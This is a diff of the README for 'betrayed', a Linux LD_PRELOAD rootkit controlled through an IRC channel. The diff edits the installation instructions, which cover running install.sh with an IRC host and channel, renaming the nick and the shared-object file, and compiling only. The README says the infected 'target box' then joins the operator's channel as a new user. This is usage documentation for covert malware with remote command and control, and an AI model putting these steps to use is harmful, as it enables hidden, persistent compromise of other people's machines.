@@ -1,3 +1,4 @@
+
 # betrayed
 ## basic info
  * betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.  
@@ -12,13 +13,13 @@
  * ANY OF THE CONFIGURATION VARIABLES DECLARED AT RUNTIME BY `install.sh` CAN BE CHANGED.
    * see function `write_conf` in install.sh for variables that can be altered @ runtime.
    * for example, `NICK` & `SONAME`
-     * _example:_ `NICK=mynewnick SONAME=mynewsoname.so ./install.sh` 
-`./install.sh <host> '<channel>'`
+     * _example:_ `NICK=mynewnick SONAME=mynewsoname.so ./install.sh`
+ * `./install.sh <host> '<channel>'`
+   * _i.e.:_ `./install.sh host.org '#imgay'`
  * upon successful installation, `install.sh` will `cat /dev/null` straight away
    * causing betrayed to create its main connection process
    * without this, the rootkit will join the channel off of the next adequate process
  * _compile only:_ `COMPILE_ONLY=1 ./install.sh ...` compiles the rootkit in the cwd. 
-  
 once installed on the target box & assuming you are in your target channel, you will see a new user with a random nick join your channel. this is the box that you just installed betrayed on.
 
 #### available commands
